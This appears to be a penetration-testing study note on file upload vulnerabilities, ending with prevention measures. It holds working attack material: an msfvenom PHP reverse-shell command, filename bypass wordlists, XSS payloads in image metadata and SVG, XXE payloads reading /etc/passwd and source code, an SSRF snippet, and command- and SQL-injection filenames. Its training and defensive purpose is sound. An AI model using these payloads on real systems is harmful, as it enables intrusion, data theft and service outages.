# File Upload Attacks

Vulnerability score: High or Critical

## Effect of File Upload Attacks

- Remote code execution
- XSS
- XXE
- Denial of Service
- Overwriting system file & configurations
  
## Cause of File Upload Attacks

- No restrictions on file type
- No file content validation
- Not validating file names

## How to approach File Upload Attacks

### Identify web framework

- using curl or browser developer tools, identify the web framework used by the application
- Check response headers like `X-Powered-By`, `Server`, etc.
- Look for specific URL patterns or file extensions that indicate a particular framework
- Use tools like `Wappalyzer` or `BuiltWith` to automate the identification process

#### brute force index.[language extension]

- modern web frameworks have web routes that hides the extensions of the files served on frontend.
- However, some applications may still have default files like `index.php`, `index.asp`, `index.jsp`, etc.
- Try brute forcing the `index.[language extension]` to identify the web framework.
- the response status code and response body can help identify the framework as the right file will return a `200 OK` status code with the expected content.
- The web frameworks can use multiple extensions, so try brute forcing multiple extensions.

### Vulnerability identification

- Once the web framework is identified, test weather you can upload a file with the same extension as the backend language.
- For POC, create a simple file that outputs `Hello World`.
- Brute upload the POC file with all the allowed extensions of the identified web framework.
- If the file is uploaded successfully, access the file via browser to check if the code is executed for any extension.
- Try client side validations if there is & whitelist bypass.
- If the content is blocked even with the allowed extensions, means the content type is also being validated on the server side.
- Try bypassing the type filters.


### Upload Exploits

- Once the vulnerability is identified, upload various exploits based on the backend language of the web application.
- Use publicly available web shells or the ones from `seclists`.
- For example, for php, `phpbash` is the popular web shell.

#### Generate custom reverse shells

- If web shells are not working, try generating custom reverse shells using `msfvenom` or `revshells.com`.
- msfvenom usage is mentioned in the file: [Msfvenom Cheat Sheet](../11%20-%20File%20Upload%20Attacks//msfvenom.md)
- a sample command to generate a php reverse shell using msfvenom is shown below:
  
  ```bash
  msfvenom -p php/reverse_php LHOST=OUR_IP LPORT=OUR_PORT -f raw > reverse.php

  ```

## shells

- Web shells or reverse shells can be used to gain remote access to the server
- These shells can be uploaded as files and can interact with the backend server by executing shell commands and returns the output the output on the web interface.
- A web shell has to be written in the same language used by the web application's backend (e.g., PHP, ASP, JSP, etc.)


### Web Shell vs Reverse Shell

- A web shell works when a port on the server is open to accept incoming connections (usually port 80 or 443 for HTTP/HTTPS) to connect with the web server's terminal.
![Web Shell](./images/Web%20Shell.png)

- A reverse shell works when the server is behind a firewall or NAT and cannot accept incoming connections. In this case, the server initiates an outbound connection to the attacker's machine, which is listening for incoming connections.
![Reverse Shell](./images/Reverse%20Shell.png)



## Client side validation bypass

- Modify the DOM elements to remove restrictions on file types or sizes.
- Use proxies and modify the request directly to bypass client-side validation.

## Server side validation bypass

- there can be 2 types of validations on server side:

  1. **Whitelist validation**: Only allows specific file types or extensions. Its more preferred than blacklist validation.
  2. **Blacklist validation**: Blocks specific file types or extensions. Its less secure than whitelist validation.
   
### Blacklist bypass
  - **Case manipulation**: If servers might be configured to consider file extensions case insensitive than blacklist comparison can be bypassed by changing the case of the file extension (e.g., `.PHP` instead of `.php`).
  - **Using uncommon extensions**: Upload files with uncommon or less-known extensions that are not in the blacklist.

### Whitelist bypass

- **Double extension**: Upload files with double extensions like `shell.php.jpg` or `shell.asp.png`.
- **Reverse double extension**: Sometimes, the web server only checks the presence of the allowed extensions as executable extensions. So, uploading files like `shell.php.jpg` will bypass the validation. Because even though the file ends with `.jpg`, the presence of `.php` makes the server treat it as a php file. 
- **Character injection**: Inject special characters between the file name and extension to bypass validation. Such as:
  - %20 (URL encoded space): `shell.php%20.jpg`
  - %0a (URL encoded newline): `shell.php%0a.jpg`
  - %00 (null byte): `shell.php%00.jpg` (web server ignores everything after null byte - may not work on modern servers like after PHP v5.x)
  - / (slash): `shell.php/.jpg`
  - .\ (dot backslash): `shell.php.\jpg`
  - . (dot): `shell.php.jpg.`
  - … (multiple dots): `shell.php....jpg`
  - : (colon): `shell.php:jpg` (may work on Windows the same way as null byte - web servers may ignore anything after colon)

We can use a script to generate all permutations of the above techniques to upload the POC file.

```bash

# double extensions
for char in '%20' '%0a' '%00' '%0d0a' '/' '.\\' '.' '…' ':' ''; do
    for ext in '.phar' '.phps' '.phtm' '.pht' '.pgif' ''; do
        echo "shell$char$ext.jpg" >> wordlist.txt
        echo "shell$ext$char.jpg" >> wordlist.txt
        echo "shell.jpg$char$ext" >> wordlist.txt
        echo "shell.jpg$ext$char" >> wordlist.txt
    done
done

```

#### How to approach server side validation
  - Once we find the language used by the backend, we can use fuzzing to try uploading a POC file with various extensions of that language to get any different response, indicating a successful upload. we can use `PayloadAllTheThings` or `seclists` for the list of extensions.
  - Make sure not to encode the extensions while fuzzing as web servers usually do not decode the extensions when processing file uploads.

## Type Filters Bypass

- The servers can also check for content types as validation.
- But most of the times, there can only be whitelist/validation for 1 content type category at a time because the web servers provide functions to check the content type and it usually falls under a specific category.


  - **Header manipulation**: There are 2 common headers for validating the content of a file which are 
  - `Content-Type`
  - `File-Content`

    **NOTE**: A file upload HTTP request has two Content-Type headers, one for the attached file (at the bottom), and one for the full request (at the top). We usually need to modify the file's Content-Type header, but in some cases the request will only contain the main Content-Type header (e.g. if the uploaded content was sent as POST data), in which case we will need to modify the main Content-Type header.

  - **MIME-Type**: changing the MIME-Type for a file can do the trick if server is validating the content type through it.
    - MIME-Type is the  first few bytes of the file which contains the `File Signature` or `Magic Bytes`.
      **TIP**: Tip: Many other image types have non-printable bytes for their file signatures, while a GIF image starts with ASCII printable bytes (as shown above), so it is the easiest to imitate. Furthermore, as the string GIF8 is common between both GIF signatures, it is usually enough to imitate a GIF image.
    - The `file` command in the linux uses MIME-Type to validate the content type of a file.

**NOTE**: We can use a combination of the two methods discussed in this section, which may help us bypass some more robust content filters. For example, we can try using an `Allowed MIME type` with a `disallowed Content-Type`, an `Allowed MIME/Content-Type` with a `disallowed extension`, or a `Disallowed MIME/Content-Type` with an `allowed extension`, and so on. Similarly, we can attempt other combinations and permutations to try to confuse the web server, and depending on the level of code security, we may be able to bypass various filters.

Useful resources:

- [Magic Bytes](https://web.archive.org/web/20240522030920/https://opensource.apple.com/source/file/file-23/file/magic/magic.mime)
- [File Signatures](https://web.archive.org/web/20240522030920/https://opensource.apple.com/source/file/file-23/file/magic/magic.mime)

## Other Attack types through File Uploads

- Sometimes the server only allows files of a specific type like SVG, XML or HTML.
- We can still use these formats to perform attacks of different types.

### XSS via File Uploads


- If the server allows to upload HTML or SVG files, we can upload a file with XSS payload to gain XSS or CSRF.
- Those applications which shows the metadata of uploaded files, can be exploited if an XSS payload is added in the metadata of the file.

    ``` bash

    # add xss payload in the metadata comments of an image file
    exiftool -Comment=' "><img src=1 onerror=alert(window.origin)>' HTB.jpg

    ```
- If the MIME-Type of an image is changed to `text/html`, some web applications may show it as an HTML document rather an image.In that case, the XSS payload will trigger even if the metadata is not displayed.
- If the server allows uploading SVG files which is basically XML, we can add XSS payloads in the SVG code to trigger XSS.

``` html

    <?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
<svg xmlns="http://www.w3.org/2000/svg" version="1.1" width="1" height="1">
    <rect x="1" y="1" width="1" height="1" fill="green" stroke="black" />
    <script type="text/javascript">alert(window.origin);</script>
</svg>

```

### XXE via File Uploads

- If the server allows uploading SVG or XML files, we can upload a file with XXE payload to perform XXE attacks.

``` html

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<svg>&xxe;</svg>

```

- We can get source code of the web application to:
  - locate the upload directory
  - identify allowed extensions
  - find the file naming scheme (handy for further exploitation)
- We can encode the data so it wont break XML format, and then decode it afterwards. for example. the following payload gets php file in base64 encoded format.

``` html

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php"> ]>
<svg>&xxe;</svg>

```

- XML data can also be utilized in PDF, Word, or PPT documents as well. Any application which is has document viewer feature would be vulnerable to blind XXE.

### SSRF via File Uploads

- File upload functionality can also be abused to perform SSRF attacks.
- We can upload the malicious payload in allowed format to make the server return response of HTTP requests to internal services.
- For example if the server allows uploading HTML files, we can upload a file with following content to perform SSRF.

``` html
<html>
  <body>
    <img src="http://internal-service.local/admin" />
  </body>
</html>
```

### DoS via File Uploads

Many file upload vulnerabilities can lead to **Denial of Service (DoS)** attacks on web servers, potentially crashing or severely degrading server performance.

##### 1. XXE-Based DoS Attacks
- Can use previously discussed XXE payloads to achieve DoS
- Similar techniques as covered in Web Attacks module  
- Exploits XML parsing vulnerabilities to overwhelm server resources

##### 2. Decompression Bomb (ZIP Archives)
- **Target**: File types using data compression (e.g., ZIP archives)
- **Attack Vector**: Upload malicious ZIP archive containing nested ZIP archives
- **Mechanism**:
  - Web application automatically unzips uploaded archive
  - Nested archives create exponential data growth
  - Can lead to petabytes of data when unpacked
- **Result**: Back-end server crash due to resource exhaustion

##### 3. Pixel Flood Attack (Image Files)
- **Target**: Image files with compression (JPG, PNG)
- **Attack Method**:
  - Create normal image (e.g., 500×500 pixels)
  - Manually modify compression metadata
  - Set image dimensions to extremely large values (e.g., `0xffff × 0xffff = 4 gigapixels`)
- **Impact**:
  - Web application attempts to allocate memory for perceived image size
  - Server exhausts memory resources
  - Back-end server crash

##### 4. Oversized File Upload
- **Attack Vector**: Upload excessively large files
- **Vulnerability**: Upload forms that don't limit or check file size before upload
- **Consequences**:
  - Server hard drive fills up
  - System crash or severe performance degradation
  - Storage resource exhaustion

##### 5. Directory Traversal DoS
- **Prerequisite**: Upload function vulnerable to directory traversal
- **Attack Method**: Upload files to system directories using path traversal (e.g., `../../../etc/passwd`)
- **Potential Impact**:
  - Overwrite critical system files
  - Fill up system partitions
  - Cause system instability or crash

#### Key Characteristics of Upload DoS Attacks
- **Resource Exhaustion**: Memory, storage, or CPU overload
- **Automated Processing**: Attacks triggered by automatic file handling
- **Minimal Attacker Effort**: Small malicious files can cause massive resource consumption
- **Difficult Detection**: May appear as legitimate file uploads initially

#### Prevention Measures
- Implement file size limits
- Validate file types and content
- Restrict upload directories
- Scan for malicious content
- Implement resource quotas
- Use secure file handling libraries

### Injections via File Names

- **OS Command Injection**: If a server process file name, or shows the file name, we can try injecting commands in the file name to get OS command injection.
- For example, if we use `file$(whoami).jpg` or `file${`whoami`}.jpg` or `file.jpg ||whoami` as file name, it may lead to command injection on some servers.
-  **SQL Injection**: If the server stores the file name in a database without proper sanitization, we can try SQL injection payloads in the file name to exploit SQL injection vulnerabilities.
   - For example, using `file';select+sleep(10);--.jpg` as file name may lead to SQL injection.

### Upload Directory Disclosure

- If the image is used in a feedback or submission form, we might not get the link to the uploaded file directly.
- In such cases, we can try to find the upload directory by:
  - Inspecting the source code of the web application if available.
  - Using directory brute forcing tools like `dirb`, `gobuster`, or `ffuf` to find the upload directory.
  - Use IDOR techniques if the application uses predictable file names or IDs for uploaded files.
  - Enforce error messages that reveal the upload path when accessing non-existent files or triggering file name already exists errors.
  - Submit the file with long names or special characters to see if the error messages reveal the upload path.

### Windows Specific Attacks

We can also use a few **Windows-specific techniques** in some of the attacks we discussed in the previous sections.

#### Reserved Characters Attack
- **Attack Vector**: Use reserved characters such as `|`, `<`, `>`, `*`, or `?`
- **Mechanism**: These characters are usually reserved for special uses like wildcards
- **Exploitation**:
  - If the web application does not properly sanitize these names or wrap them within quotes
  - They may refer to another file (which may not exist) and cause an error
  - Error messages can disclose the upload directory

#### Windows Reserved Names
- **Target**: Use Windows reserved names for the uploaded file name
- **Examples**: `CON`, `COM1`, `LPT1`, or `NUL`
- **Impact**: 
  - May cause an error as the web application will not be allowed to write a file with this name
  - Can lead to information disclosure through error messages

#### Windows 8.3 Filename Convention Attack
- **Background**: Older versions of Windows were limited to short file names
- **Mechanism**: Uses Tilde character (`~`) to complete the file name
- **How it works**:
  - To refer to a file called `hackthebox.txt`, we can use `HAC~1.TXT` or `HAC~2.TXT`
  - The digit represents the order of matching files that start with `HAC`
  - Windows still supports this convention for backward compatibility
- **Attack Examples**:
  - Write a file called `WEB~1.CON` to overwrite the `web.conf` file
  - Write files that replace sensitive system files
- **Potential Outcomes**:
  - Information disclosure through errors
  - Denial of Service (DoS) on the back-end server
  - Accessing private files

### Advanced File Upload Attacks

In addition to all of the attacks we have discussed in this module, there are more **advanced attacks** that can be used with file upload functionalities.

#### Automatic Processing Vulnerabilities
- **Target**: Any automatic processing that occurs to uploaded files
- **Common Processing Examples**:
  - Encoding a video
  - Compressing a file
  - Renaming a file
- **Risk**: These processes may be exploited if not securely coded

#### Library-Based Vulnerabilities
- **Public Exploits**: Some commonly used libraries may have public exploits for such vulnerabilities
- **Example**: The **AVI upload vulnerability** leading to XXE in `ffmpeg`
- **Impact**: Well-documented exploits make these attacks more accessible

#### Custom Code Vulnerabilities
- **Challenge**: When dealing with custom code and custom libraries
- **Detection Requirements**: 
  - More advanced knowledge and techniques required
  - In-depth code analysis needed
  - Understanding of custom processing logic
- **Potential**: May lead to discovering advanced file upload vulnerabilities in some web applications

#### Key Considerations
- **Processing Chain**: Each step in the file processing chain is a potential attack vector
- **Third-Party Libraries**: Keep track of known vulnerabilities in processing libraries
- **Custom Logic**: Custom file processing code requires thorough security review
- **Input Validation**: All processing steps should validate input at each stage


## Prevention of File Upload Attacks

### Extension validation

- Implement strict whitelist & blacklist just in case the whitelist is bypassed.
- Check special characters in the file names.
- Reject files with double extensions or suspicious patterns
- Normalize file names to a standard format before validation
- Apply both frontend and backend validation for file extensions

### Content validation

- Validate MIME types against a whitelist of allowed types
- Check file signatures (magic bytes) to verify actual file type
- Use libraries to inspect file content for anomalies
- Scan uploaded files with antivirus software

### Avoid Upload Disclosure

- Always hide the upload directory path.
- Use separate script to allow the users to access the uploaded files with proper authentication & authorization to prevent IDOR vulnerabilities.
- Sanitize user input for file paths to avoid LFI/RFI vulnerabilities.

### Secure Headers 

- **Content-Disposition**: Used to specify how the content should be displayed in the browser. Setting it to `attachment` instructs the browser to download the file rather than render it inline.
- **Content-Type**: Specifies the MIME type of the file, ensuring that the browser knows how to handle the file content appropriately.
- **X-Content-Type-Options: nosniff**: Prevents the browser from MIME-type sniffing, which helps mitigate security risks by ensuring that the browser adheres strictly to the specified `Content-Type`.

### Random File Names

- Store the files in storage with random names to avoid directory detection.
- Store the original names in database with sanitization to prevent OS command injections.

### Standalone server & server configuration

- Use a separate server to store & serve the files so that only upload server is compromised & not the whole backend.
- Configure web server to not allow read/write access to any directory other then the one where uploaded files are kept.

### Code listing

- Add the server language functions to web server blacklist which can cause shell execution.
- Always show general errors rather showing errors thrown by server hosted system

### Others

- Limit file size
- Update any used libraries
- Scan uploaded files for malware or malicious strings
- Utilize a Web Application Firewall (WAF) as a secondary layer of protection

**NOTE**: we can use these as a checklist when doing pentesting for file upload features & can provide development team as well to fill the gaps in initial stages.